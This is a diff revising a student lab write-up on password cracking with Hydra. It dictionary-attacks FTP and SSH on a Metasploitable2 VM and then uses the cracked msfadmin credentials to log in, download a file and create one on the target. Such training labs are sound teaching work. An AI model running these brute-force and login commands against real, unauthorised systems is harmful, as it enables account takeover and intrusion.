@@ -1,100 +1,92 @@
-Experiment 6 — Password Strength Assessment using Hydra
-
+Experiment 6 — Password Strength
+Assessment using Hydra
 Aim
 To perform password cracking using Hydra tool on FTP and SSH services.
-
---------------------------------------------------
-
-Step 1: Start Machines
-- Start Kali Linux VM
-- Start Metasploitable2 VM
-
---------------------------------------------------
-
+Theory
+Hydra
+Hydra is a password cracking tool used to perform brute-force and dictionary attacks on various
+network services such as FTP, SSH, HTTP, Telnet, and SMTP.
+Hydra tests multiple username and password combinations automatically until the correct
+credentials are found.
+FTP (File Transfer Protocol)
+FTP is a network protocol used to transfer files between systems over a network.
+Default Port:
+21
+SSH (Secure Shell)
+SSH is a secure remote login protocol used for encrypted communication between systems.
+Default Port:
+22
+Requirements
+• Kali Linux VM
+• Metasploitable2 VM
+• Hydra Tool
+• FTP Service
+• SSH Service
+Procedure
+Step 1: Start Virtual Machines
+• Start Kali Linux VM
+• Start Metasploitable2 VM
 Step 2: Locate Password Dictionary
-
 In Kali terminal:
 locate unix_passwords.txt
-
---------------------------------------------------
-
-Step 3: Edit Dictionary (if needed)
-
-Open file:
-vi /opt/metasploit-framework/embedded/framework/data/wordlists/unix_passwords.txt
-
+Step 3: Create/Edit Password Dictionary
+Open wordlist:
+nano passwords.txt
 Add:
 msfadmin
-
+password
+admin
+123456
 Save and exit.
-
---------------------------------------------------
-
 Step 4: Run Hydra Password Cracking
-
 Command:
-hydra -l msfadmin -P /opt/metasploit-framework/embedded/framework/data/wordlists/unix_passwords.txt ftp://192.168.62.137
-
+hydra -l msfadmin -P passwords.txt ftp://192.168.245.133
 Observation:
-- Hydra matches password successfully.
-- Password found: msfadmin
-
---------------------------------------------------
-
-Step 5: Connect using FTP
-
+• Hydra starts dictionary attack.
+• Correct password is matched successfully.
+Password found:
+msfadmin
+FTP Connection
+Step 5: Connect to FTP Service
 Command:
-ftp 192.168.62.137
-
+ftp 192.168.245.133
 Enter:
 Username: msfadmin
 Password: msfadmin
-
---------------------------------------------------
-
-Step 6: FTP Navigation Commands
-
+Observation:
+• FTP login successful.
+Step 6: Navigate Directories
+Commands:
 ls
 cd vulnerable
 cd twiki20030201
-
---------------------------------------------------
-
-Step 7: Download File from Target
-
-get TWiki20030201.tar.gz
-
 Observation:
-- File transferred successfully from target machine.
-
---------------------------------------------------
-
-SSH Connection
-
-Step 8: Connect using SSH
-
+• Successfully navigated target directories.
+Step 7: Download File
 Command:
-ssh -o HostKeyAlgorithms=+ssh-rsa msfadmin@192.168.62.137
-
+get TWiki20030201.tar.gz
+Observation:
+• File transferred successfully from target system.
+SSH Connection
+Step 8: Connect using SSH
+Command:
+ssh -o HostKeyAlgorithms=+ssh-rsa msfadmin@192.168.245.133
 Enter password:
 msfadmin
-
 Observation:
-- SSH login successful.
-
---------------------------------------------------
-
-Step 9: Execute Commands in Target Machine
-
+• SSH login successful.
+Step 9: Execute Commands in Target System
+Commands:
 ls
 cd /home
 echo "Welcome to Cyber Security Lab" > 1.txt
 cat 1.txt
-
 Observation:
-- File created successfully in target system.
-
---------------------------------------------------
-
+• File created successfully in target machine.
+Observation
+• Hydra successfully performed dictionary attack.
+• FTP and SSH credentials were cracked.
+• Remote access to target system was achieved.
 Result
-Successfully performed password cracking using Hydra and accessed FTP and SSH services using cracked credentials.
+Successfully performed password cracking using Hydra and accessed FTP and SSH services using
+cracked credentials.
